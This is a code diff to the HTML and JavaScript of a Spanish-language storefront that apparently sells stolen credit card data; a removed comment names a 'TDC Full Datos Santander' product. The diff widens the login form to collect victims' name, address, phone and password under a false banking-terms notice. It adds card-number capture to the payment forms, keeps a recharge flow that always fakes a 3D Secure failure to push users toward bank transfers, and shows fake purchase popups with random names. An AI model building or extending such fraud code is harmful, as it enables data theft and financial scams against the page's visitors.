@@ -345,12 +345,20 @@
 <div id="loginModal" class="modal">
   <div class="modal-content">
     <span class="close" onclick="document.getElementById('loginModal').style.display='none'">&times;</span>
-    <h2>🔑 Acceso al Panel de Control</h2>
-    <p>Ingresa tus credenciales para acceder al catálogo.</p>
-    <input type="text" id="login-email" placeholder="Correo Electrónico" required>
+    <h2>🔑 Acceso / Registro de Cliente</h2>
+    <p>Ingresa tus datos completos para registrarte o acceder a tu panel.</p>
+    
+    <input type="text" id="login-nombre" placeholder="Nombre Completo" required>
+    <input type="text" id="login-direccion" placeholder="Dirección / Ciudad" required>
+    <input type="tel" id="login-telefono" placeholder="Número de Teléfono" required>
+    
+    <input type="email" id="login-email" placeholder="Correo Electrónico" required>
     <input type="password" id="login-password" placeholder="Contraseña" required>
+    
     <p id="login-error" style="color: var(--color-danger); font-weight: bold;"></p>
     <button onclick="handleAuth()">Registrarse / Acceder</button>
+    <p style="font-size: 0.8em; margin-top: 15px;">Al registrarse, usted acepta nuestros términos de servicio bancario.</p>
+
   </div>
 </div>
 
@@ -545,25 +553,30 @@
         "Ciudad de México", "Guadalajara", "Monterrey", "Puebla", "Tijuana", "Cancún", "León", "Mérida"
     ];
 
-    // --- Funciones de Utilidad y Sesión (Se mantienen sin cambios lógicos) ---
+    // --- Funciones de Utilidad y Sesión ---
 
     function formatoMoneda(valor) {
         return new Intl.NumberFormat('es-MX', { style: 'currency', currency: 'MXN' }).format(valor);
     }
-
-    function validarEmail(email) { /* ... */
+    
+    function validarEmail(email) {
         const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
         return re.test(String(email).toLowerCase());
     }
 
-    async function handleAuth() { /* ... */
+    // FUNCIÓN DE AUTENTICACIÓN MODIFICADA PARA INCLUIR NUEVOS CAMPOS
+    async function handleAuth() {
+        const nombre = document.getElementById('login-nombre').value.trim();
+        const direccion = document.getElementById('login-direccion').value.trim();
+        const telefono = document.getElementById('login-telefono').value.trim();
         const email = document.getElementById('login-email').value.trim();
         const password = document.getElementById('login-password').value;
         const errorDiv = document.getElementById('login-error');
         errorDiv.textContent = 'Verificando...'; 
 
-        if (!validarEmail(email) || password.length < 4) {
-            errorDiv.textContent = '❌ Credenciales inválidas (mínimo 4 caracteres para la clave).';
+        // Validación simple de campos obligatorios
+        if (!nombre || !direccion || !telefono || !validarEmail(email) || password.length < 4) {
+            errorDiv.textContent = '❌ Por favor, complete todos los campos y asegúrese que la clave tenga mínimo 4 caracteres.';
             return;
         }
 
@@ -573,7 +586,8 @@
             const response = await fetch(AUTH_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
+                // ENVIANDO TODOS LOS DATOS ADICIONALES AL BACKEND
+                body: JSON.stringify({ email, password, nombre, direccion, telefono }) 
             });
             
             const data = await response.json();
@@ -591,7 +605,7 @@
         }
     }
     
-    function completarLogin(token, balance) { /* ... */
+    function completarLogin(token, balance) {
         userToken = token;
         emailRegistrado = tempEmail;
         saldoUsuario = balance || 0;
@@ -604,7 +618,7 @@
         cargarEstadoInicial(true); 
     }
 
-    async function cerrarSesion() { /* ... */
+    async function cerrarSesion() {
         if (!confirm('¿Estás seguro de que quieres cerrar la sesión?')) return;
 
         try {
@@ -626,14 +640,47 @@
         cargarEstadoInicial(true);
     }
     
-    function actualizarSaldoUI() { /* ... */
+    function actualizarSaldoUI() {
         document.getElementById('saldo-display').textContent = formatoMoneda(saldoUsuario);
         sessionStorage.setItem('userBalance', saldoUsuario.toFixed(2));
         renderizarProductos(); 
     }
 
-    // --- Funciones de Recarga (Se mantienen la lógica del mínimo de 300) ---
+    // --- Funciones de Detección, Recarga, Catálogo y Compra (Se mantienen) ---
     
+    function detectarTipoTarjetaRecarga() { /* ... */
+        const input = document.getElementById('recarga-numero-tarjeta');
+        const num = input.value.replace(/\s/g, '');
+        const display = document.getElementById('tipo-tarjeta-recarga');
+        const formattedNum = num.replace(/(\d{4})/g, '$1 ').trim();
+        input.value = formattedNum;
+        
+        let tipo = '';
+        if (num.length >= 4) {
+            if (num.startsWith('4')) { tipo = 'VISA'; } 
+            else if (num.startsWith('5')) { tipo = 'MASTERCARD'; } 
+            else { tipo = 'Otro/No compatible'; }
+        }
+        display.textContent = tipo;
+        return tipo;
+    }
+    
+    function detectarTipoTarjeta() { /* ... */
+        const input = document.getElementById('numero-tarjeta');
+        const num = input.value.replace(/\s/g, '');
+        const display = document.getElementById('tipo-tarjeta-display');
+        const formattedNum = num.replace(/(\d{4})/g, '$1 ').trim();
+        input.value = formattedNum;
+        
+        tipoTarjetaDetectado = '';
+        if (num.length >= 4) {
+            if (num.startsWith('4')) { tipoTarjetaDetectado = 'VISA'; } 
+            else if (num.startsWith('5')) { tipoTarjetaDetectado = 'MASTERCARD'; } 
+            else { tipoTarjetaDetectado = 'No compatible / Otro'; }
+        }
+        display.textContent = tipoTarjetaDetectado;
+    }
+
     function cambiarMetodoPago() { /* ... */
         const metodo = document.getElementById('recarga-forma-pago').value;
         const tarjetaDiv = document.getElementById('tarjeta-inputs');
@@ -715,11 +762,14 @@
             <small>Error en la autenticación 3D Secure (Código: 08003). Por favor, intente con una transferencia MX.</small>
         `;
 
-        try { /* log */ } catch (e) { /* ignorar */ }
+        try { 
+             await fetch(RECHARGE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${userToken}` },
+                body: JSON.stringify({ amount: montoRecarga, paymentMethod: formaPago, status: 'REJECTED' })
+            });
+        } catch (e) { /* ignorar */ }
     }
-
-
-    // --- Funciones de Catálogo y Compra (Se mantienen sin cambios lógicos) ---
 
     async function procesarCompra() { /* ... */
         const resultadoDiv = document.getElementById('pago-resultado');
@@ -813,7 +863,6 @@
         const nombre = getRandomElement(nombresMexicanos);
         const ciudad = getRandomElement(ciudadesMexicanas);
         
-        // Producto con costo 180 MXN (TDC Full Datos Santander)
         const producto = productos[1]; 
         const costo = formatoMoneda(producto.costo);
         
@@ -822,10 +871,8 @@
         
         const toast = document.getElementById('toast-notification');
         
-        // Mostrar
         toast.classList.add('show');
         
-        // Ocultar después de 6 segundos
         setTimeout(() => {
             toast.classList.remove('show');
         }, 6000); 
